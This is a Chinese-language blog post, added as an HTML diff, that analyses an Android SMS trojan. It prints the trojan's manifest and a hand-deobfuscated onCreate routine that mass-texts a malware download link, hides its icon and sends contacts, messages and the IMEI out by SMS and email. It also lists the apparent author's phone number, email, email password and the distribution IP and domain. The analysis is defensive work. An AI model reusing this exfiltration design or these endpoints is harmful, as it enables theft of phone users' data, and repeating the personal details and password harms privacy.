@@ -1,0 +1,807 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="7s8wMtCUkn0si9Ku0tgMVDiPBmNXQRIj3L9imZLNFTg">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!--  <meta name="description" content="杨建国的博客，专注android领域"> -->
+    <!--  <meta name="keyword"  content="undefined"> -->
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <!-- yangjg add meta data for SEO keyword optimization -->
+    
+        <meta name="keywords" content="android virus">
+    
+
+    
+    <meta name="description" content="前言：今天一位朋友突然发朋友圈说自己的手机中毒了，群发短信给所有的通讯录朋友，处于好奇，就问朋友发的什么，从事android编程将近三年了，从来没有写过一个有损用户利益的程序，也没有见过真正意义上的android病毒。既然有这个机会，那就好好看看这个病毒究竟厉害在什么地方了。在这里斗胆和大家探讨下，懂编程的朋友顺便探讨学习下。不懂的朋友就了解下病毒特征，防止下次遇到同样的问题。">
+
+    <title>
+        
+          一条短信引发的血案——Android病毒分析 - 杨建国的博客 | 渐行渐远
+        
+    </title>
+
+    <link rel="canonical" href="http://www.aman.site/2017/02/20/android-virus-cleave/">
+
+    <!-- yangjg change for debug -->
+    
+        <link rel="stylesheet" href="/css/bootstrap.css">
+        <!-- Custom CSS -->
+        <link rel="stylesheet" href="/css/hux-blog.css">
+    
+
+    <!-- Pygments Github CSS -->
+    <link rel="stylesheet" href="/css/syntax.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    
+        <!-- Hux change font-awesome CDN to qiniu -->
+        <link href="http://cdn.staticfile.org/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">渐行渐远</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About Me</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="http://www.aman.site/img/icon_wechat.jpg" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('img/post-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#Android" title="Android">Android</a>
+                        
+                    </div>
+                    <h1>一条短信引发的血案——Android病毒分析</h1>
+                    <h2 class="subheading">一条短信引发的血案</h2>
+                    <span class="meta">
+                        Posted by JianGuo on
+                        2017-02-20
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <blockquote>
+<p>前言：今天一位朋友突然发朋友圈说自己的手机中毒了，群发短信给所有的通讯录朋友，处于好奇，就问朋友发的什么，从事android编程将近三年了，从来没有写过一个有损用户利益的程序，也没有见过真正意义上的android病毒。既然有这个机会，那就好好看看这个病毒究竟厉害在什么地方了。在这里斗胆和大家探讨下，懂编程的朋友顺便探讨学习下。不懂的朋友就了解下病毒特征，防止下次遇到同样的问题。</p>
+</blockquote>
+<a id="more"></a>
+<p>很快，朋友给我发送了当时中毒时的短信截图。<br><img src="./webwxgetmsgimg.png" alt="微信消息截图"></p>
+<p>PS：这是我迄今为止见过“最高大上”的请柬了。想必新郎一定是个程序猿吧，23333～</p>
+<p>很明显，就是一个apk，只要你点击这个链接，这个apk就会很快下载到你手机里，下载完成一般就会提示是否安装，如果点击安装，恭喜，你中计了。接下来，就是它发作的时候来了。</p>
+<h2 id="确定病毒的作者"><a href="#确定病毒的作者" class="headerlink" title="确定病毒的作者"></a>确定病毒的作者</h2><p>先来看看下载地址的IP，竟然没有用域名！差评！这也是够低成本犯罪啊。。。那我们先来看看45.127.97.231这个ip，看看能不能挖掘到点什么重要信息。<br>ip的位置信息：<br><img src="./ip_address.png" alt="ip位置"></p>
+<p>果然是境外犯罪，增加了追查难度。在香港租个主机。</p>
+<p>用<a href="http://reverseip.domaintools.com/search/?q=45.127.97.231" target="_blank" rel="external">http://reverseip.domaintools.com/search/?q=45.127.97.231</a> 反查下绑定的域名<br><img src="./ips_domain.png" alt="反查下绑定的域名"></p>
+<p>果然有域名，而且只有一个，基本可以判断这个服务器不是租的，那再来查查域名绑定的信息。  </p>
+<p><img src="./bugydq.science.png" alt="域名绑定的信息"><br>详情可以点击下面的链接：<br><a href="https://whois.aliyun.com/whois/domain/bugydq.science?spm=5176.8076989.339865.11.maXkw8&amp;file=bugydq.science" target="_blank" rel="external">https://whois.aliyun.com/whois/domain/bugydq.science?spm=5176.8076989.339865.11.maXkw8&amp;file=bugydq.science</a></p>
+<p>那QQ已经有了，电话也有了（18750074991）。以后肯定会用到的。哈哈。</p>
+<h2 id="APK分析"><a href="#APK分析" class="headerlink" title="APK分析"></a>APK分析</h2><p>那我们再来再看看这个apk吧。<br><img src="./apk_analyze.png" alt="apk_analyze"><br>安装包的小的惊人啊，只有200k左右，现在的网速就是点完就下完的节奏，根本不给你后悔的机会。</p>
+<h3 id="程序清单文件"><a href="#程序清单文件" class="headerlink" title="程序清单文件"></a>程序清单文件</h3><p>做android应用开发的朋友都知道，程序所有的组件，权限都需要在manifest文件中生命，那我们看看这个可怕的清单文件中都申请了什么。</p>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;manifest
+    xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
+    android:versionCode=&quot;98&quot;
+    android:versionName=&quot;5.5.365&quot;
+    package=&quot;com.iekjdx&quot;&gt;
+    &lt;uses-sdk
+        android:minSdkVersion=&quot;8&quot;
+        android:targetSdkVersion=&quot;19&quot; /&gt;
+    &lt;uses-permission android:name=&quot;android.permission.RECEIVE_WAP_PUSH&quot; /&gt;
+    &lt;uses-permission android:name=&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot; /&gt;
+    &lt;uses-permission android:name=&quot;android.permission.MODIFY_AUDIO_SETTINGS&quot; /&gt;
+    &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot; /&gt;
+    &lt;uses-permission android:name=&quot;android.permission.RECEIVE_USER_PRESENT&quot; /&gt;
+    &lt;uses-permission android:name=&quot;android.permission.READ_CONTACTS&quot; /&gt;
+    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;
+    &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot; /&gt;
+    &lt;uses-permission android:name=&quot;android.permission.READ_SMS&quot; /&gt;
+    &lt;uses-permission android:name=&quot;android.permission.WRITE_SETTINGS&quot; /&gt;
+    &lt;uses-permission android:name=&quot;android.permission.VIBRATE&quot; /&gt;
+    &lt;uses-permission android:name=&quot;android.permission.RECEIVE_SMS&quot; /&gt;
+    &lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot; /&gt;
+    &lt;uses-permission android:name=&quot;android.permission.GET_TASKS&quot; /&gt;
+    &lt;uses-permission android:name=&quot;android.permission.WRITE_SMS&quot; /&gt;
+    &lt;uses-permission android:name=&quot;android.permission.SEND_SMS&quot; /&gt;
+    &lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot; /&gt;
+    &lt;application
+        android:theme=&quot;@ref/0x0103000a&quot;
+        android:label=&quot;@ref/0x7f060000&quot;
+        android:icon=&quot;@ref/0x7f020000&quot;
+        android:name=&quot;com.phone.stop.db.PhoneApplication&quot;
+        android:allowBackup=&quot;true&quot;&gt;
+        &lt;activity
+            android:theme=&quot;@ref/0x7f070002&quot;
+            android:label=&quot;@ref/0x7f060000&quot;
+            android:name=&quot;com.phone2.stop.activity.MainActivity&quot;
+            android:excludeFromRecents=&quot;false&quot;&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;
+                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;
+            &lt;/intent-filter&gt;
+        &lt;/activity&gt;
+        &lt;activity
+            android:label=&quot;@ref/0x7f060000&quot;
+            android:name=&quot;com.phone2.stop.activity.DeleteActivity&quot;
+            android:excludeFromRecents=&quot;false&quot;&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name=&quot;android.intent.action.DELETE&quot; /&gt;
+                &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;
+                &lt;data android:scheme=&quot;package&quot; /&gt;
+            &lt;/intent-filter&gt;
+        &lt;/activity&gt;
+        &lt;service
+            android:name=&quot;com.phone.stop6.service.SecondService&quot;
+            android:process=&quot;:thee_second2_service3&quot; /&gt;
+        &lt;service
+            android:name=&quot;com.phone.stop6.service.BootService&quot;
+            android:enabled=&quot;true&quot;
+            android:exported=&quot;true&quot; /&gt;
+        &lt;service
+            android:name=&quot;com.phone.stop6.service.SmsService&quot;
+            android:process=&quot;:thee_second2_service3&quot; /&gt;
+        &lt;receiver
+            android:name=&quot;com.phone.stop.receiver.BootReceiver&quot;&gt;
+            &lt;intent-filter
+                android:priority=&quot;2147483647&quot;&gt;
+                &lt;action android:name=&quot;android.intent.action.PACKAGE_RESTARTED&quot; /&gt;
+                &lt;action android:name=&quot;android.net.conn.CONNECTIVITY_CHANGE&quot; /&gt;
+                &lt;action android:name=&quot;android.intent.action.PACKAGE_ADDED&quot; /&gt;
+                &lt;action android:name=&quot;android.intent.action.PACKAGE_REPLACED&quot; /&gt;
+                &lt;action android:name=&quot;android.intent.action.PACKAGE_INSTALL&quot; /&gt;
+                &lt;action android:name=&quot;android.intent.action.ACTION_PACKAGE_CHANGED&quot; /&gt;
+                &lt;action android:name=&quot;android.intent.action.SIG_STR&quot; /&gt;
+                &lt;action android:name=&quot;android.intent.action.ACTION_POWER_CONNECTED&quot; /&gt;
+                &lt;action android:name=&quot;android.intent.action.ACTION_POWER_DISCONNECTED&quot; /&gt;
+                &lt;action android:name=&quot;android.intent.action.BATTERY_CHANGED&quot; /&gt;
+                &lt;action android:name=&quot;android.intent.action.PHONE_STATE&quot; /&gt;
+                &lt;action android:name=&quot;android.intent.action.BATTERY_LOW&quot; /&gt;
+                &lt;action android:name=&quot;android.intent.action.BATTERY_OKAY&quot; /&gt;
+                &lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot; /&gt;
+            &lt;/intent-filter&gt;
+        &lt;/receiver&gt;
+        &lt;receiver
+            android:name=&quot;com.phone.stop.receiver.SMSReceiver&quot;
+            android:permission=&quot;android.permission.BROADCAST_SMS&quot;&gt;
+            &lt;intent-filter
+                android:priority=&quot;2147483647&quot;&gt;
+                &lt;action android:name=&quot;android.provider.Telephony.SMS_RECEIVED&quot; /&gt;
+            &lt;/intent-filter&gt;
+        &lt;/receiver&gt;
+        &lt;receiver
+            android:name=&quot;com.phone.stop.receiver.MyDeviceAdminReceiver&quot;
+            android:permission=&quot;android.permission.BIND_DEVICE_ADMIN&quot;&gt;
+            &lt;meta-data
+                android:name=&quot;android.app.device_admin&quot;
+                android:resource=&quot;@ref/0x7f040000&quot; /&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name=&quot;android.app.action.DEVICE_ADMIN_ENABLED&quot; /&gt;
+            &lt;/intent-filter&gt;
+        &lt;/receiver&gt;
+    &lt;/application&gt;
+&lt;/manifest&gt;
+</code></pre>
+<p>看完这个清单文件吓出宝宝一身冷汗，一个请柬你至于把google全家的权限都拿到么？至于开三个服务，三个广播接收器么？要这么多权限准没好事。看看都申请了什么权限： </p>
+<ul>
+<li>android.permission.RECEIVE_WAP_PUSH  —— 允许应用程序接收和处理 WAP 信息，可借此监视您的信息,或者将信息删除而不向您显示。这就是大摇大摆的拦截短信啊。</li>
+<li>android.permission.RECEIVE_BOOT_COMPLETED —— 接收开机启动</li>
+<li>android.permission.MODIFY_AUDIO_SETTINGS —— 修改声音设置，这是想静音偷偷干坏事么。</li>
+<li>android.permission.WRITE_EXTERNAL_STORAGE —— 写外置sd卡权限</li>
+<li>android.permission.RECEIVE_USER_PRESENT —— 允许接收android.intent.action.USER_PRESENT广播，该广播事件是用户唤醒屏幕时发送的。</li>
+<li>android.permission.READ_CONTACTS —— 查看联系人权限</li>
+<li>android.permission.INTERNET —— 网络权限</li>
+<li>android.permission.READ_PHONE_STATE —— 获取手机基本数据权限，主要是获取用户手机的IMEI。</li>
+<li>android.permission.READ_SMS —— 读取短信息权限</li>
+<li>android.permission.WRITE_SETTINGS —— 修改系统设置信息权限。</li>
+<li>android.permission.VIBRATE —— 手机振动权限。</li>
+<li>android.permission.RECEIVE_SMS —— 允许程序监控收到短信的状态</li>
+<li>android.permission.ACCESS_NETWORK_STATE —— 允许程序获取网络状态</li>
+<li>android.permission.GET_TASKS —— 允许程序获取信息有关当前或最近运行的任务,一个缩略的任务状态,是否活动等等</li>
+<li>android.permission.WRITE_SMS —— 写短信</li>
+<li>android.permission.SEND_SMS —— 发短信</li>
+<li>android.permission.ACCESS_WIFI_STATE —— 允许程序获取当前的WiFi连接状态</li>
+</ul>
+<p>一旦用户赋予了程序这些权限，基本上就等于你的手机任人宰割了。因此，大家在平时，记得不要将不常用的权限以及敏感数据的权限授权给不信任的程序。</p>
+<p>不但申请了权限，木马病毒还声明了三个服务和三个广播接收器：</p>
+<p>服务：</p>
+<ul>
+<li>com.phone.stop6.service.SecondService —— 程序守护进程服务<pre><code class="xml">&lt;service
+  android:name=&quot;com.phone.stop6.service.SecondService&quot;
+  android:process=&quot;:thee_second2_service3&quot; /&gt;
+</code></pre>
+</li>
+<li>com.phone.stop6.service.BootService —— 程序启动服务<pre><code class="xml">&lt;service
+  android:name=&quot;com.phone.stop6.service.BootService&quot;
+  android:enabled=&quot;true&quot;
+  android:exported=&quot;true&quot; /&gt;
+</code></pre>
+</li>
+<li>com.phone.stop6.service.SmsServic —— 短信收发服务，在单独的进程中运行。<pre><code class="xml">&lt;service
+  android:name=&quot;com.phone.stop6.service.SmsService&quot;
+  android:process=&quot;:thee_second2_service3&quot; /&gt;
+</code></pre>
+</li>
+</ul>
+<p>广播接收器：</p>
+<ul>
+<li>com.phone.stop.receiver.BootReceiver<br>为了能够大概率的启动病毒，使出了浑身解数，监听了这么多广播事件：<ul>
+<li>android.intent.action.PACKAGE_RESTARTED —— 监听程序被kill的事件</li>
+<li>android.net.conn.CONNECTIVITY_CHANGE ——  监听网络变化</li>
+<li>android.intent.action.PACKAGE_ADDED —— 监听安装程序</li>
+<li>android.intent.action.PACKAGE_REPLACED —— 监听程序更新</li>
+<li>android.intent.action.PACKAGE_INSTALL —— 监听程序安装</li>
+<li>android.intent.action.ACTION_PACKAGE_CHANGED —— 安装包发生改变</li>
+<li>android.intent.action.SIG_STR —— 手机信号强度变化</li>
+<li>android.intent.action.ACTION_POWER_CONNECTED —— 连接电源</li>
+<li>android.intent.action.ACTION_POWER_DISCONNECTED —— 拔出电源</li>
+<li>android.intent.action.BATTERY_CHANGED —— 电池电量发生变化</li>
+<li>android.intent.action.PHONE_STATE —— 手机状态发生变化</li>
+<li>android.intent.action.BATTERY_LOW —— 低电量提示</li>
+<li>android.intent.action.BATTERY_OKAY —— 充电完成提示</li>
+<li>android.intent.action.BOOT_COMPLETED —— 启动完成</li>
+</ul>
+</li>
+<li>com.phone.stop.receiver.SMSReceiver<br>该广播接收器接收收到短信时的系统广播。</li>
+<li>com.phone.stop.receiver.MyDeviceAdminReceiver<br>该广播接收器主要处理root成功后收到的DEVICE_ADMIN_ENABLED广播。</li>
+</ul>
+<p>那接下来就看看这个程序是如何作恶的，代码上又是如何实现的。</p>
+<h2 id="反编译java代码"><a href="#反编译java代码" class="headerlink" title="反编译java代码"></a>反编译java代码</h2><p>apk文件中包含了程序运行的二进制文件和主要的资源文件。我们需要将二进制文件反编译成程序代码，才能够看到其具体的实现逻辑。由于该程序的代码进行了代码混淆，我们又没有途径拿到作者混淆时产生的map文件，因此给后续的分析带来了一些麻烦。</p>
+<p>dex的反编译相比还是比较简单的。反编译工具也有很多，我当然选择了开源的dex2jar（<a href="https://github.com/pxb1988/dex2jar" target="_blank" rel="external">see on github</a>）和JD-GUI(<a href="https://github.com/java-decompiler/jd-gui" target="_blank" rel="external">see on github</a>)了。</p>
+<p>用法也是相对简单：  </p>
+<ol>
+<li>./dex2jar/dex2jar.sh 2.apk，生成 2_dex2jar.jar</li>
+<li>./jd-gui/jd-gui，弹出图形界面，选择 File-Open File… ，打开 2_dex2jar.jar</li>
+</ol>
+<p>我们就看到了代码的结构。<br><img src="./code_dir_structure.png" alt="代码的结构"><br>由于代码混淆给分析带来了不少的麻烦，不过没关系。代码量少，我们硬着头皮看也能看懂。</p>
+<p>那接下来就看看这个病毒的代码实现吧。</p>
+<h2 id="病毒代码分析"><a href="#病毒代码分析" class="headerlink" title="病毒代码分析"></a>病毒代码分析</h2><h3 id="一、-基本信息"><a href="#一、-基本信息" class="headerlink" title="一、 基本信息"></a>一、 基本信息</h3><p>病毒名称：2.apk<br>病毒类型：木马<br>样本MD5：<br>样本长度：212937 字节<br>发现时间：206.12.26<br>感染系统：Android Froyo 2.2.x及以上</p>
+<h3 id="二、-概述"><a href="#二、-概述" class="headerlink" title="二、 概述"></a>二、 概述</h3><p>三、 样本特征</p>
+<ol>
+<li><p>敏感权限<br>获取短信息，获取联系人，发送短信，发送邮件</p>
+</li>
+<li><p>入口点和恶意模块<br>我们从程序的入口类MainActivity.java的onCreate()函数开始分析：</p>
+<blockquote>
+<p>注：以下代码非程序原始代码，是根据混淆之后的代码人工去混淆后的代码，可能和源码有一定差异，但是程序功能没有发生改变，</p>
+</blockquote>
+</li>
+</ol>
+<p>com/phone2/stop/activity/MainActivity.java：</p>
+<pre><code class="java">protected void onCreate(Bundle paramBundle) {
+    super.onCreate(paramBundle);
+    // 1.从数据库读取联系人并发送内容为“***：酒筵,恭请阁下光临，邀请函： 103.226.126.27/15/2.apk”的短信
+    readContacts();
+    setContentView(R.layout.activity_main);
+    // 2. 隐藏应用程序图标。如果设置一个app的mainActivity为COMPONENT_ENABLED_STATE_DISABLED状态,则不会再launcher的程序图标中发现该app
+    getPackageManager().setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+    // 设置加密用的字符串
+    SharedPreferencesManagerUtil.setStaker();
+    SharedPreferencesManagerUtil.initPhoneNumber(this);
+    SharedPreferencesManagerUtil.setSendEmailAccount(this);
+    SharedPreferencesManagerUtil.setReciveEmailAccount(this);
+    SharedPreferencesManagerUtil.setSendEmailPwd(this);
+    SharedPreferencesManagerUtil.initEndTime(this);
+    if (!SharedPreferencesManager.getInstance(this).getHasSendPhoneInfo()) {
+      //3. 获取手机IMEI信息、手机型号、手机品牌、系统版本等信息，并将这些消息裁剪成70个字符后，替换掉敏感字符，发送给13097169061
+      String str = ((TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
+      SendTextMessageHelper.requestSendTextMessage(&quot;&quot; + str + &quot;\n&quot; + phoneInfoHelper.getPhoneInfo(), this);
+      SharedPreferencesManager.getInstance(this).setHasSendPhoneInfo(true);
+    }
+    // 4. 删除已经发送的消息记录
+    OtherHelper.deleteMessage(this);
+    // 5. 重头戏来了, 将所有的短信和联系人已邮件的形式发送到13097169061@wo.cn的邮箱
+    if (SharedPreferencesManager.getInstance(this).getEmailMessageContactsSwitch()) {
+      MessageSender.start(this);
+    }
+    // 6.获取超级管理员权限，并启动服务
+    getSuperPermission();
+  }
+</code></pre>
+<p>我们再来看看启动了服务后又干了些什么，服务无非就是让系统能够常驻内存，监听新的短信和设备状态变化，以随时发送和接收相关的信息。</p>
+<p>关于程序其他方面的分析，如架构啊、流程等方面的分析个人觉得没有什么分析的价值，从技术角度来说，这个程序写的很烂，当然，在当时的技术水平条件下也应该是比较可以的了。目前的6.0以上的系统上，由于系统权限的严格控制，想要做这些事情已经很难了。</p>
+<p>整个木马在数据的上传方面还是比较落后的，目前看来没有用到网络上传的方式，而是采用了邮箱和短信的方式，这样个木马病毒的追踪带来了一些方便。</p>
+<p>程序中使用到了javamail_forAndroid 用于发送邮件，这个开源库的使用还是值得我们学习的。</p>
+<p>吐槽：<br>看到下面这样的代码，我只想骂回去！由此可见作者的素质…</p>
+<pre><code class="java">public void setNiMa(String paramString) {
+    SharedPreferences.Editor localEditor = this.preferences.edit();
+    localEditor.putString(&quot;cao_ni_ma_pojie_wo_de_mazi&quot;, paramString);
+    localEditor.commit();
+  }
+  public String getNiMa() {
+    return this.preferences.getString(&quot;cao_ni_ma_pojie_wo_de_mazi&quot;, &quot;000000&quot;);
+  }
+  public void setNi2Ma(String paramString) {
+    SharedPreferences.Editor localEditor = this.preferences.edit();
+    localEditor.putString(&quot;cao_ni_ma_pojie_wo_de_mazi2&quot;, paramString);
+    localEditor.commit();
+  }
+  public String getNi2Ma() {
+    return this.preferences.getString(&quot;cao_ni_ma_pojie_wo_de_mazi2&quot;, &quot;000000&quot;);
+  }
+</code></pre>
+<ol>
+<li>敏感字符串<br>```java <h1 id="木马作者手机号：1309716-1875007"><a href="#木马作者手机号：1309716-1875007" class="headerlink" title="木马作者手机号：1309716 1875007"></a>木马作者手机号：1309716<strong><strong> 1875007</strong></strong></h1></li>
+</ol>
+<h1 id="木马作者邮箱号：1309716-wo-cn"><a href="#木马作者邮箱号：1309716-wo-cn" class="headerlink" title="木马作者邮箱号：1309716**@wo.cn"></a>木马作者邮箱号：1309716<em>**</em>@wo.cn</h1><h1 id="木马作者邮箱密码：qq123123"><a href="#木马作者邮箱密码：qq123123" class="headerlink" title="木马作者邮箱密码：qq123123"></a>木马作者邮箱密码：qq123123</h1><h1 id="木马散播主机：45-127-97-231"><a href="#木马散播主机：45-127-97-231" class="headerlink" title="木马散播主机：45.127.97.231"></a>木马散播主机：45.127.97.231</h1><h1 id="相关域名：bugydq-science"><a href="#相关域名：bugydq-science" class="headerlink" title="相关域名：bugydq.science"></a>相关域名：bugydq.science</h1><p>```</p>
+<p>四、 行为分析</p>
+<ol>
+<li>从数据库读取联系人并发送内容为“<em>*</em>：酒筵,恭请阁下光临，邀请函： 103.226.126.27/15/2.apk”的短信</li>
+<li>隐藏应用程序图标。如果设置一个app的mainActivity为COMPONENT_ENABLED_STATE_DISABLED状态,则不会再launcher的程序图标中发现该app</li>
+<li>获取手机IMEI信息、手机型号、手机品牌、系统版本等信息，并将这些消息裁剪成70个字符后，替换掉敏感字符，发送给13097169061</li>
+<li>删除已经发送的消息记录</li>
+<li>重头戏来了, 将所有的短信和联系人已邮件的形式发送到13097169061@wo.cn的邮箱</li>
+<li>获取超级管理员权限，并启动服务，监听系统状态和短信，彩信及网络状态</li>
+<li>如果后续收到验证码也会及时发送给木马作者，多么恐怖的一件事。</li>
+</ol>
+<p>特别声明：<br>为了保障本案例中的木马病毒的源码不被某些人二次开发利用，本人不会公开相关的代码。至于代码作者的相关信息，是通过合法的渠道获取，仅供学习交流之用。切勿用于人身攻击或者打击报复。如有侵权，请联系我，我会及时删除。</p>
+<h2 id="关于Android-安全多说点"><a href="#关于Android-安全多说点" class="headerlink" title="关于Android 安全多说点"></a>关于Android 安全多说点</h2><p>从这篇文章希望大家能够对自己的个人信息引起重视，千万不要点击下载来路不明的apk应用程序。对于权限的授权也要三思而后行。然而，Android网络安全面临的不仅仅就是这些，也远比文中提到的这个过时的木马病毒严重的多。即便是一个正常的程序，也会被通过各种手段成为病毒的傀儡。</p>
+<p>要解决这些问题，一是要考我们开发者的良知和安全意识，二是靠政府强有力的摧毁这个链条背后的黑产，不惜一切的保证公民能够享受安全可信的网络环境。同时，也需要我们每个人提高自己的安全意识，不要将密码记录到手机的任何地方，密码不要设置任何和你相关的字符或者数字，可以告诉大家一个好的方式，将你认为好记的字母或者数字进行hash运算，将结果作为密码进行设置，以后即便忘了密码，也可以重新计算得到。或者像我一样，使用数学公式作为密码。</p>
+
+
+                <hr>
+
+                
+                <!-- 多说 Share start -->
+                </style>
+                <div class="ds-share"
+                    style="text-align: right"
+                    data-thread-key="2017/02/20/android-virus-cleave/"
+                    data-title="一条短信引发的血案——Android病毒分析"
+                    data-url="http://www.aman.site/2017/02/20/android-virus-cleave/"
+                    data-images="http://www.aman.site/2017/02/20/android-virus-cleave/img/post-bg.jpg"
+                    data-content="
+前言：今天一位朋友突然发朋友圈说自己的手机中毒了，群发短信给所有的通讯录朋友，处于好奇，就问... | 杨建国的博客 | 渐行渐远 " >
+                    <div class="ds-share-inline">
+                      <ul  class="ds-share-icons-16">
+                        <li data-toggle="ds-share-icons-more"><a class="ds-more" href="#">分享到：</a></li>
+                        <li><a class="ds-wechat flat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+                        <li><a class="ds-weibo flat" href="javascript:void(0);" data-service="weibo">微博</a></li>
+                        <li><a class="ds-douban flat" href="javascript:void(0);" data-service="douban">豆瓣</a></li>
+                      </ul>
+                      <div class="ds-share-icons-more">
+                      </div>
+                    </div>
+                <hr>
+                </div>
+                <!-- 多说 Share end-->
+                
+
+                <ul class="pager">
+                    
+                    
+                        <li class="next">
+                            <a href="/2016/08/04/SufaceTexture_vs_sufaceView/" data-toggle="tooltip" data-placement="top" title="认识SurfaceView和SurfaceTexture">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+                <!-- 多说评论框 start -->
+                <div class="comment">
+                    <div class="ds-thread"
+                        data-thread-key="2017/02/20/android-virus-cleave/"
+                        data-title="一条短信引发的血案——Android病毒分析"
+                        data-url="http://www.aman.site/2017/02/20/android-virus-cleave/" >
+                    </div>
+                </div>
+                <!-- 多说评论框 end -->
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#Android" title="Android">Android</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="http://xuwenzhi.com" target="_blank">徐文志程序猿</a></li>
+                    
+                        <li><a href="http://songyichao.com" target="_blank">宋祎超</a></li>
+                    
+                        <li><a href="http://huangxuan.me" target="_blank">Hux Blog</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
